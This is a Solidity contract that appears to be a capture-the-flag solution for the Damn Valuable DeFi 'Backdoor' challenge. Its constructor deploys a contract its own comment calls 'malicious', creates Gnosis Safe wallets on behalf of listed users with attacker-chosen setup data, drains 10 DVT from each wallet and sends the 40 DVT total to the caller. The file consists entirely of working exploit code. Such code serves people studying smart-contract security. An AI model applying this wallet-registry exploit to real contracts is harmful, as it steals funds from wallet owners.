// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./BackdoorApproval.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract BackdoorAttack {
    constructor(
        GnosisSafeProxyFactory walletFactory,
        IProxyCreationCallback registry,
        DamnValuableToken token,
        address[] memory users,
        address singleton,
        bytes[] memory encodedData
    ) {
        // Deploy the malicious contract
        new BackdoorApproval();

        for (uint i = 0; i < users.length; i++) {
            // Create the GnosisSafe wallet on behalf of the user
            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
                singleton,
                encodedData[i],
                i,
                registry
            );

            // Transfer the 10 DVT from the proxy wallet to us
            token.transferFrom(address(proxy), address(this), 10 ether);
        }

        // Transfer the player all 40 DVT
        token.transfer(msg.sender, 40 ether);
    }
}
